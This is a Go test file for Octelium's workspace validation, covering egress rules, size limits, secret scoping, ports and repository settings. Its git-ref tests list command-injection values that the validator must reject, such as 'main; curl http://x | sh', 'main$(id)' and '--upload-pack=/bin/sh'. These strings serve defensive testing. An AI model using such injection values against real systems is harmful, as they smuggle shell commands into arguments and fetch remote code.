/*
 * Copyright Octelium Labs, LLC. All rights reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package wsutils

import (
	"context"
	"fmt"
	"strings"
	"testing"

	"github.com/octelium/octelium/apis/main/cordiumv1"
	"github.com/octelium/octelium/apis/main/metav1"
	"github.com/stretchr/testify/assert"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
)

func TestValidateWorkspaceNetwork(t *testing.T) {
	ctx := context.Background()

	newReq := func(egress *cordiumv1.Workspace_Spec_Runtime_Network_Egress) *ValidateWorkspaceReq {
		return &ValidateWorkspaceReq{
			Workspace: &cordiumv1.Workspace{
				Metadata: &metav1.Metadata{Name: "ws"},
				Spec: &cordiumv1.Workspace_Spec{
					Runtime: &cordiumv1.Workspace_Spec_Runtime{
						Network: &cordiumv1.Workspace_Spec_Runtime_Network{
							Egress: egress,
						},
					},
				},
				Status: &cordiumv1.Workspace_Status{
					SpaceRef: &metav1.ObjectReference{Uid: "spc"},
				},
			},
			Space: &cordiumv1.Space{
				Metadata: &metav1.Metadata{Name: "spc", Uid: "spc"},
				Status:   &cordiumv1.Space_Status{},
			},
		}
	}

	assert.Nil(t, ValidateWorkspace(ctx, newReq(nil)))

	assert.Nil(t, ValidateWorkspace(ctx, newReq(&cordiumv1.Workspace_Spec_Runtime_Network_Egress{
		DefaultAction: cordiumv1.Workspace_Spec_Runtime_Network_Egress_DENY,
		Rules: []*cordiumv1.Workspace_Spec_Runtime_Network_Rule{
			{
				Action: cordiumv1.Workspace_Spec_Runtime_Network_Rule_ALLOW,
				Cidrs:  []string{"203.0.113.0/24"},
				Ports:  []uint32{443},
			},
		},
	})))

	assert.NotNil(t, ValidateWorkspace(ctx, newReq(&cordiumv1.Workspace_Spec_Runtime_Network_Egress{
		Rules: []*cordiumv1.Workspace_Spec_Runtime_Network_Rule{
			{
				Cidrs: []string{"203.0.113.0/24"},
			},
		},
	})))

	assert.NotNil(t, ValidateWorkspace(ctx, newReq(&cordiumv1.Workspace_Spec_Runtime_Network_Egress{
		Rules: []*cordiumv1.Workspace_Spec_Runtime_Network_Rule{
			{
				Action: cordiumv1.Workspace_Spec_Runtime_Network_Rule_DENY,
				Cidrs:  []string{"203.0.113.0"},
			},
		},
	})))

	assert.NotNil(t, ValidateWorkspace(ctx, newReq(&cordiumv1.Workspace_Spec_Runtime_Network_Egress{
		Rules: []*cordiumv1.Workspace_Spec_Runtime_Network_Rule{
			{
				Action: cordiumv1.Workspace_Spec_Runtime_Network_Rule_DENY,
			},
		},
	})))
}

func workspaceValidationReq() *ValidateWorkspaceReq {
	return &ValidateWorkspaceReq{
		Workspace: &cordiumv1.Workspace{
			Metadata: &metav1.Metadata{Name: "ws"},
			Spec:     &cordiumv1.Workspace_Spec{},
			Status:   &cordiumv1.Workspace_Status{SpaceRef: &metav1.ObjectReference{Uid: "space-uid"}},
		},
		Space: &cordiumv1.Space{Metadata: &metav1.Metadata{Name: "space", Uid: "space-uid"}},
	}
}

func TestValidateWorkspaceRequiredFields(t *testing.T) {
	for _, tc := range []struct {
		name   string
		change func(*ValidateWorkspaceReq)
	}{
		{name: "workspace", change: func(req *ValidateWorkspaceReq) { req.Workspace = nil }},
		{name: "spec", change: func(req *ValidateWorkspaceReq) { req.Workspace.Spec = nil }},
		{name: "space", change: func(req *ValidateWorkspaceReq) { req.Space = nil }},
		{name: "status", change: func(req *ValidateWorkspaceReq) { req.Workspace.Status = nil }},
		{name: "space reference", change: func(req *ValidateWorkspaceReq) { req.Workspace.Status.SpaceRef = nil }},
	} {
		t.Run(tc.name, func(t *testing.T) {
			req := workspaceValidationReq()
			tc.change(req)
			assert.Equal(t, codes.InvalidArgument, status.Code(ValidateWorkspace(t.Context(), req)))
		})
	}
	assert.Equal(t, codes.InvalidArgument, status.Code(ValidateWorkspace(t.Context(), nil)))
}

func TestValidateWorkspaceRuntimeBoundaries(t *testing.T) {
	for _, tc := range []struct {
		name  string
		limit int
		set   func(*cordiumv1.Workspace_Spec_Runtime, int)
	}{
		{name: "command", limit: 1024, set: func(runtime *cordiumv1.Workspace_Spec_Runtime, n int) { runtime.Cmd = strings.Repeat("x", n) }},
		{name: "entrypoint", limit: 1024, set: func(runtime *cordiumv1.Workspace_Spec_Runtime, n int) { runtime.Entrypoint = strings.Repeat("x", n) }},
		{name: "environment key", limit: 64, set: func(runtime *cordiumv1.Workspace_Spec_Runtime, n int) {
			runtime.EnvVars = []*cordiumv1.Workspace_Spec_Runtime_EnvVar{{Key: strings.Repeat("K", n), Type: &cordiumv1.Workspace_Spec_Runtime_EnvVar_Value{Value: "value"}}}
		}},
		{name: "environment value", limit: 1024, set: func(runtime *cordiumv1.Workspace_Spec_Runtime, n int) {
			runtime.EnvVars = []*cordiumv1.Workspace_Spec_Runtime_EnvVar{{Key: "KEY", Type: &cordiumv1.Workspace_Spec_Runtime_EnvVar_Value{Value: strings.Repeat("v", n)}}}
		}},
		{name: "environment count", limit: 128, set: func(runtime *cordiumv1.Workspace_Spec_Runtime, n int) {
			for i := 0; i < n; i++ {
				runtime.EnvVars = append(runtime.EnvVars, &cordiumv1.Workspace_Spec_Runtime_EnvVar{Key: fmt.Sprintf("KEY%d", i), Type: &cordiumv1.Workspace_Spec_Runtime_EnvVar_Value{Value: "value"}})
			}
		}},
		{name: "task command", limit: 5000, set: func(runtime *cordiumv1.Workspace_Spec_Runtime, n int) {
			runtime.Tasks = []*cordiumv1.Workspace_Spec_Runtime_Task{{Run: strings.Repeat("x", n), Type: cordiumv1.Workspace_Spec_Runtime_Task_POST_START}}
		}},
		{name: "task count", limit: 128, set: func(runtime *cordiumv1.Workspace_Spec_Runtime, n int) {
			for i := 0; i < n; i++ {
				runtime.Tasks = append(runtime.Tasks, &cordiumv1.Workspace_Spec_Runtime_Task{Name: fmt.Sprintf("task%d", i), Run: "true", Type: cordiumv1.Workspace_Spec_Runtime_Task_ON_CREATE})
			}
		}},
		{name: "task environment count", limit: 128, set: func(runtime *cordiumv1.Workspace_Spec_Runtime, n int) {
			task := &cordiumv1.Workspace_Spec_Runtime_Task{Run: "true", Type: cordiumv1.Workspace_Spec_Runtime_Task_ON_CREATE}
			for i := 0; i < n; i++ {
				task.EnvVars = append(task.EnvVars, &cordiumv1.Workspace_Spec_Runtime_Task_EnvVar{Key: fmt.Sprintf("KEY%d", i), Value: "value"})
			}
			runtime.Tasks = []*cordiumv1.Workspace_Spec_Runtime_Task{task}
		}},
		{name: "added capabilities", limit: 100, set: func(runtime *cordiumv1.Workspace_Spec_Runtime, n int) {
			runtime.Capabilities = &cordiumv1.Workspace_Spec_Runtime_Capabilities{}
			for i := 0; i < n; i++ {
				runtime.Capabilities.Add = append(runtime.Capabilities.Add, "NET_BIND_SERVICE")
			}
		}},
		{name: "dropped capabilities", limit: 100, set: func(runtime *cordiumv1.Workspace_Spec_Runtime, n int) {
			runtime.Capabilities = &cordiumv1.Workspace_Spec_Runtime_Capabilities{}
			for i := 0; i < n; i++ {
				runtime.Capabilities.Drop = append(runtime.Capabilities.Drop, "ALL")
			}
		}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			for _, n := range []int{tc.limit, tc.limit + 1} {
				t.Run(fmt.Sprint(n), func(t *testing.T) {
					req := workspaceValidationReq()
					req.Workspace.Spec.Runtime = &cordiumv1.Workspace_Spec_Runtime{}
					tc.set(req.Workspace.Spec.Runtime, n)
					err := ValidateWorkspace(t.Context(), req)
					if n == tc.limit {
						assert.Nil(t, err)
					} else {
						assert.Equal(t, codes.InvalidArgument, status.Code(err))
					}
				})
			}
		})
	}
}

func TestValidateWorkspaceRuntimeInvalidValues(t *testing.T) {
	for _, tc := range []struct {
		name    string
		runtime *cordiumv1.Workspace_Spec_Runtime
	}{
		{name: "empty environment key", runtime: &cordiumv1.Workspace_Spec_Runtime{EnvVars: []*cordiumv1.Workspace_Spec_Runtime_EnvVar{{Type: &cordiumv1.Workspace_Spec_Runtime_EnvVar_Value{Value: "value"}}}}},
		{name: "non ASCII environment key", runtime: &cordiumv1.Workspace_Spec_Runtime{EnvVars: []*cordiumv1.Workspace_Spec_Runtime_EnvVar{{Key: "clé", Type: &cordiumv1.Workspace_Spec_Runtime_EnvVar_Value{Value: "value"}}}}},
		{name: "missing environment source", runtime: &cordiumv1.Workspace_Spec_Runtime{EnvVars: []*cordiumv1.Workspace_Spec_Runtime_EnvVar{{Key: "KEY"}}}},
		{name: "empty secret reference", runtime: &cordiumv1.Workspace_Spec_Runtime{EnvVars: []*cordiumv1.Workspace_Spec_Runtime_EnvVar{{Key: "KEY", Type: &cordiumv1.Workspace_Spec_Runtime_EnvVar_FromSecret{}}}}},
		{name: "empty task", runtime: &cordiumv1.Workspace_Spec_Runtime{Tasks: []*cordiumv1.Workspace_Spec_Runtime_Task{{Type: cordiumv1.Workspace_Spec_Runtime_Task_ON_CREATE}}}},
		{name: "missing task type", runtime: &cordiumv1.Workspace_Spec_Runtime{Tasks: []*cordiumv1.Workspace_Spec_Runtime_Task{{Run: "true"}}}},
		{name: "invalid added capability", runtime: &cordiumv1.Workspace_Spec_Runtime{Capabilities: &cordiumv1.Workspace_Spec_Runtime_Capabilities{Add: []string{"NET_ADMIN;id"}}}},
		{name: "invalid dropped capability", runtime: &cordiumv1.Workspace_Spec_Runtime{Capabilities: &cordiumv1.Workspace_Spec_Runtime_Capabilities{Drop: []string{"net_admin"}}}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			req := workspaceValidationReq()
			req.Workspace.Spec.Runtime = tc.runtime
			assert.Equal(t, codes.InvalidArgument, status.Code(ValidateWorkspace(t.Context(), req)))
		})
	}
}

func TestValidateWorkspaceSecretScope(t *testing.T) {
	for _, tc := range []struct {
		name        string
		secretSpace string
		include     bool
		code        codes.Code
	}{
		{name: "same Space", secretSpace: "space-uid", include: true, code: codes.OK},
		{name: "another Space", secretSpace: "other-space", include: true, code: codes.InvalidArgument},
		{name: "missing Secret", code: codes.NotFound},
	} {
		t.Run(tc.name, func(t *testing.T) {
			req := workspaceValidationReq()
			req.Workspace.Spec.Runtime = &cordiumv1.Workspace_Spec_Runtime{EnvVars: []*cordiumv1.Workspace_Spec_Runtime_EnvVar{{Key: "TOKEN", Type: &cordiumv1.Workspace_Spec_Runtime_EnvVar_FromSecret{FromSecret: "token"}}}}
			if tc.include {
				req.SecretList = &cordiumv1.SecretList{Items: []*cordiumv1.Secret{{Metadata: &metav1.Metadata{Name: "token"}, Status: &cordiumv1.Secret_Status{SpaceRef: &metav1.ObjectReference{Uid: tc.secretSpace}}}}}
			}
			assert.NotPanics(t, func() {
				assert.Equal(t, tc.code, status.Code(ValidateWorkspace(t.Context(), req)))
			})
		})
	}
}

func TestValidateWorkspaceRejectsUnknownTaskEnums(t *testing.T) {
	for _, task := range []*cordiumv1.Workspace_Spec_Runtime_Task{
		{Run: "true", Type: cordiumv1.Workspace_Spec_Runtime_Task_Type(99)},
		{Run: "true", Type: cordiumv1.Workspace_Spec_Runtime_Task_ON_CREATE, OnFailure: cordiumv1.Workspace_Spec_Runtime_Task_OnFailure(99)},
	} {
		req := workspaceValidationReq()
		req.Workspace.Spec.Runtime = &cordiumv1.Workspace_Spec_Runtime{Tasks: []*cordiumv1.Workspace_Spec_Runtime_Task{task}}
		assert.Equal(t, codes.InvalidArgument, status.Code(ValidateWorkspace(t.Context(), req)))
	}
}

func TestCheckGitRef(t *testing.T) {

	t.Run("valid", func(t *testing.T) {
		for _, ref := range []string{
			"",
			"main",
			"master",
			"v1.2.3",
			"release/2026-01",
			"feature/JIRA-123_thing",
			"users/bob/wip",
			"9a1f0c4e2b7d8f6a3c5e1b9d7f2a4c6e8b0d2f4a",
			"HEAD",
			"1.0.0+build.7",
		} {
			assert.Nil(t, checkGitRef("branch", ref), "ref should be valid: %q", ref)
		}
	})

	t.Run("shell metacharacters are rejected", func(t *testing.T) {
		for _, ref := range []string{
			"main; curl http://x | sh",
			"main && id",
			"main`id`",
			"main$(id)",
			"main\nid",
			"main id",
			"main|id",
			"main>out",
			"main'x'",
			`main"x"`,
			"main&",
		} {
			assert.NotNil(t, checkGitRef("branch", ref), "ref should be rejected: %q", ref)
		}
	})

	t.Run("leading dash is rejected", func(t *testing.T) {
		for _, ref := range []string{
			"-main",
			"--upload-pack=/bin/sh",
			"-o",
		} {
			assert.NotNil(t, checkGitRef("checkout", ref), "ref should be rejected: %q", ref)
		}
	})

	t.Run("ref-name rules", func(t *testing.T) {
		for _, ref := range []string{
			"a..b",
			"..",
			"main.lock",
			"refs/heads/",
		} {
			assert.NotNil(t, checkGitRef("branch", ref), "ref should be rejected: %q", ref)
		}
	})

	t.Run("length is bounded", func(t *testing.T) {
		long := make([]byte, 300)
		for i := range long {
			long[i] = 'a'
		}
		assert.NotNil(t, checkGitRef("branch", string(long)))
	})
}

func TestValidateWorkspaceImageBoundaries(t *testing.T) {
	for _, size := range []int{0, 1, 5000, 5001} {
		t.Run(fmt.Sprint(size), func(t *testing.T) {
			req := workspaceValidationReq()
			req.Workspace.Spec.Image = &cordiumv1.Workspace_Spec_Image{Type: &cordiumv1.Workspace_Spec_Image_Dockerfile_{Dockerfile: &cordiumv1.Workspace_Spec_Image_Dockerfile{Type: &cordiumv1.Workspace_Spec_Image_Dockerfile_Inline{Inline: strings.Repeat("x", size)}}}}
			err := ValidateWorkspace(t.Context(), req)
			if size > 0 && size <= 5000 {
				assert.Nil(t, err)
			} else {
				assert.Equal(t, codes.InvalidArgument, status.Code(err))
			}
		})
	}
}

func TestValidateWorkspaceApplications(t *testing.T) {
	for _, tc := range []struct {
		name         string
		applications []*cordiumv1.Workspace_Spec_Application
		valid        bool
	}{
		{name: "first port", applications: []*cordiumv1.Workspace_Spec_Application{{Name: "web", Port: 1}}, valid: true},
		{name: "last port", applications: []*cordiumv1.Workspace_Spec_Application{{Name: "web", Port: 65535}}, valid: true},
		{name: "zero port", applications: []*cordiumv1.Workspace_Spec_Application{{Name: "web"}}},
		{name: "negative port", applications: []*cordiumv1.Workspace_Spec_Application{{Name: "web", Port: -1}}},
		{name: "large port", applications: []*cordiumv1.Workspace_Spec_Application{{Name: "web", Port: 65536}}},
		{name: "missing name", applications: []*cordiumv1.Workspace_Spec_Application{{Port: 8080}}},
		{name: "duplicate name", applications: []*cordiumv1.Workspace_Spec_Application{{Name: "web", Port: 8080}, {Name: "web", Port: 9090}}},
		{name: "two defaults", applications: []*cordiumv1.Workspace_Spec_Application{{Name: "web", Port: 8080, IsDefault: true}, {Name: "api", Port: 9090, IsDefault: true}}},
		{name: "one default", applications: []*cordiumv1.Workspace_Spec_Application{{Name: "web", Port: 8080, IsDefault: true}, {Name: "api", Port: 9090}}, valid: true},
		{name: "long display name", applications: []*cordiumv1.Workspace_Spec_Application{{Name: "web", Port: 8080, DisplayName: strings.Repeat("x", 129)}}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			req := workspaceValidationReq()
			req.Workspace.Spec.Applications = tc.applications
			err := ValidateWorkspace(t.Context(), req)
			if tc.valid {
				assert.Nil(t, err)
			} else {
				assert.Equal(t, codes.InvalidArgument, status.Code(err))
			}
		})
	}
}

func TestValidateWorkspaceRepositorySources(t *testing.T) {
	for _, tc := range []struct {
		name       string
		repository *cordiumv1.Workspace_Spec_Repository
		additional bool
		valid      bool
	}{
		{name: "primary can be empty", repository: &cordiumv1.Workspace_Spec_Repository{}, valid: true},
		{name: "HTTPS", repository: &cordiumv1.Workspace_Spec_Repository{Url: "https://github.com/org/repo"}, valid: true},
		{name: "HTTP", repository: &cordiumv1.Workspace_Spec_Repository{Url: "http://github.com/org/repo"}},
		{name: "SSH", repository: &cordiumv1.Workspace_Spec_Repository{Url: "ssh://git@github.com/org/repo"}},
		{name: "invalid URL", repository: &cordiumv1.Workspace_Spec_Repository{Url: "not a URL"}},
		{name: "unsafe branch", repository: &cordiumv1.Workspace_Spec_Repository{Url: "https://github.com/org/repo", CloneOptions: &cordiumv1.Workspace_Spec_Repository_CloneOptions{Branch: "--upload-pack=command"}}},
		{name: "unsafe checkout", repository: &cordiumv1.Workspace_Spec_Repository{Url: "https://github.com/org/repo", CloneOptions: &cordiumv1.Workspace_Spec_Repository_CloneOptions{Checkout: "main;id"}}},
		{name: "additional requires URL", repository: &cordiumv1.Workspace_Spec_Repository{}, additional: true},
		{name: "additional requires details", additional: true},
		{name: "valid additional", repository: &cordiumv1.Workspace_Spec_Repository{Url: "https://github.com/org/repo"}, additional: true, valid: true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			req := workspaceValidationReq()
			if tc.additional {
				req.Workspace.Spec.AdditionalRepositories = []*cordiumv1.Workspace_Spec_AdditionalRepository{{Name: "extra", Repository: tc.repository}}
			} else {
				req.Workspace.Spec.Repository = tc.repository
			}
			err := ValidateWorkspace(t.Context(), req)
			if tc.valid {
				assert.Nil(t, err)
			} else {
				assert.Equal(t, codes.InvalidArgument, status.Code(err))
			}
		})
	}
}

func TestValidateWorkspaceRejectsEmptyAuthenticationSource(t *testing.T) {
	for _, tc := range []struct {
		name string
		set  func(*cordiumv1.Workspace_Spec)
	}{
		{name: "repository method", set: func(spec *cordiumv1.Workspace_Spec) {
			spec.Repository = &cordiumv1.Workspace_Spec_Repository{Url: "https://github.com/org/repo", Authentication: &cordiumv1.Workspace_Spec_Repository_Authentication{}}
		}},
		{name: "repository password", set: func(spec *cordiumv1.Workspace_Spec) {
			spec.Repository = &cordiumv1.Workspace_Spec_Repository{Url: "https://github.com/org/repo", Authentication: &cordiumv1.Workspace_Spec_Repository_Authentication{Type: &cordiumv1.Workspace_Spec_Repository_Authentication_Http{Http: &cordiumv1.Workspace_Spec_Repository_Authentication_HTTP{Username: "user", Password: &cordiumv1.Workspace_Spec_Repository_Authentication_HTTP_Password{}}}}}
		}},
		{name: "registry password", set: func(spec *cordiumv1.Workspace_Spec) {
			spec.Image = &cordiumv1.Workspace_Spec_Image{Type: &cordiumv1.Workspace_Spec_Image_Registry_{Registry: &cordiumv1.Workspace_Spec_Image_Registry{Url: "alpine:latest", Authentication: &cordiumv1.Workspace_Spec_Image_Registry_Authentication{Username: "user", Password: &cordiumv1.Workspace_Spec_Image_Registry_Authentication_Password{}}}}}
		}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			req := workspaceValidationReq()
			tc.set(req.Workspace.Spec)
			assert.Equal(t, codes.InvalidArgument, status.Code(ValidateWorkspace(t.Context(), req)))
		})
	}
}
